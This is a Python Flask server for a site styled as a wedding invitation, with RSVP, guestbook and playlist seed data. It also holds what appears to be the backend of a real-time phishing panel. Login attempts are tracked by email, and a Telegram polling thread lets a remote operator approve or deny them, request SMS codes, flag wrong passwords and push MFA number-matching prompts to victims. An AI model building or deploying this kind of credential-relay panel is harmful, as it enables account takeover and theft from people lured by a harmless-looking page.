import os
import sys
import threading
import time
import requests
import random
import string
import json
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from dotenv import load_dotenv

# Load key configurations
load_dotenv()

app = Flask(__name__, static_folder='dist', static_url_path='/')
CORS(app)

# In-Memory Database / Mock Seed Data
rsvps = [
    {
        "id": "rsvp-1",
        "name": "Eleanor & Joshua Vance",
        "email": "e.vance@example.com",
        "attending": True,
        "guestsCount": 2,
        "dietaryRestrictions": "Gluten-Free for Joshua",
        "notes": "We are so thrilled to raise a glass to you both! See you in July!",
        "createdAt": datetime.utcnow().isoformat() + "Z"
    },
    {
        "id": "rsvp-2",
        "name": "Dr. Catherine Bennett",
        "email": "catherine.b@example.com",
        "attending": True,
        "guestsCount": 1,
        "dietaryRestrictions": "None",
        "notes": "Wouldn't miss this landmark celebration for the world.",
        "createdAt": (datetime.utcnow().isoformat() + "Z") # Approximated
    },
    {
        "id": "rsvp-3",
        "name": "Marcus Dupont",
        "email": "marcus.dupont@mail.fr",
        "attending": False,
        "guestsCount": 0,
        "dietaryRestrictions": "",
        "notes": "Sending all my love from Paris. Sad I cannot attend in person, but with you in spirit! ❤️",
        "createdAt": (datetime.utcnow().isoformat() + "Z") # Approximated
    }
]

guestbook = [
    {
        "id": "msg-1",
        "author": "Grandma Mabel",
        "message": "May your journey ahead be blessed with pure patience, laughter, and endless cups of morning tea. So beautiful!",
        "avatarColor": "bg-rose-100 text-rose-700",
        "createdAt": datetime.utcnow().isoformat() + "Z"
    },
    {
        "id": "msg-2",
        "author": "Uncle Robert & Aunt Judy",
        "message": "Remember to capture every little smile or sunset. Life flows by sweet and fast, make every single highlight stay forever!",
        "avatarColor": "bg-amber-100 text-amber-700",
        "createdAt": datetime.utcnow().isoformat() + "Z"
    },
    {
        "id": "msg-3",
        "author": "Clara (Maid of Honor!)",
        "message": "Let's make this the most memorable night of 2026! Jukebox voting is already intense, let's get the dance floor roaring! 💃✨",
        "avatarColor": "bg-pink-100 text-pink-700",
        "createdAt": datetime.utcnow().isoformat() + "Z"
    }
]

playlist = [
    {"id": "song-1", "title": "L-O-V-E", "artist": "Nat King Cole", "requestedBy": "Grandma Mabel", "votes": 12},
    {"id": "song-2", "title": "Can't Take My Eyes Off You", "artist": "Frankie Valli", "requestedBy": "Uncle Robert", "votes": 8},
    {"id": "song-3", "title": "Dancing Queen", "artist": "ABBA", "requestedBy": "Clara", "votes": 17},
    {"id": "song-4", "title": "La Vie En Rose", "artist": "Édith Piaf", "requestedBy": "Adele", "votes": 14}
]

logs = [
    {
        "id": "log-1",
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "type": "PAGE_VIEW",
        "details": "Guest landed on main invitation screen.",
        "ipPlaceholder": "192.168.1.45"
    }
]

active_login_attempts = {}

# Telegram implementation is abstracted to a separate module for clarity
try:
    from telegram_service import TelegramService
except Exception as e:
    print(f"Failed to import TelegramService: {e}", flush=True)

telegram_service = TelegramService()
# Register routes from a separate module to keep server.py as the app entrypoint
try:
    from routes import register_routes
    register_routes(app, telegram_service, rsvps, guestbook, playlist, logs, active_login_attempts)
except Exception as e:
    print(f"Failed to import/register routes: {e}", flush=True)

# --- TELEGRAM WORKER THREAD ---
def telegram_polling_worker():
    print("[Telegram Polling] Polling background thread initiated...", flush=True)
    while True:
        try:
            if telegram_service.is_configured():
                def on_action(attempt_id, action, payload=None):
                    attempt = active_login_attempts.get(attempt_id)
                    if attempt:
                        mapped_status = "pending"
                        if action == "approve":
                            mapped_status = "approved"
                        elif action == "deny":
                            mapped_status = "denied"
                        else:
                            mapped_status = action # e.g. "request_sms", "incorrect_password"
                        # If payload includes chosen number or candidates, set them on the attempt
                        if payload and isinstance(payload, dict):
                            if payload.get('chosen'):
                                attempt['promptNumber'] = payload.get('chosen')
                            if payload.get('candidates'):
                                attempt['promptCandidates'] = payload.get('candidates')
                        attempt["status"] = mapped_status
                        
                        logs.insert(0, {
                            "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
                            "timestamp": datetime.utcnow().isoformat() + "Z",
                            "type": "LOGIN_SUCCESS" if mapped_status == "approved" else "GATEWAY_LOGIN_ATTEMPT",
                            "details": f"[TELEGRAM COMMAND] Organizer dispatched direct interaction [{mapped_status.upper()}] for {attempt.get('email')}. Transaction status applied.",
                            "ipPlaceholder": "Telegram Remote"
                        })
                
                telegram_service.poll_updates(on_action)
        except Exception as e:
            print(f"[Telegram Polling Worker Exception] {e}", flush=True)
        time.sleep(1.5)

if __name__ == "__main__":
    # Start the telegram callback long polling loop
    t = threading.Thread(target=telegram_polling_worker, daemon=True)
    t.start()
    
    # Run server on custom port if provided (e.g. 5000 in dev) or fallback to 3000
    port = int(os.environ.get("FLASK_PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)

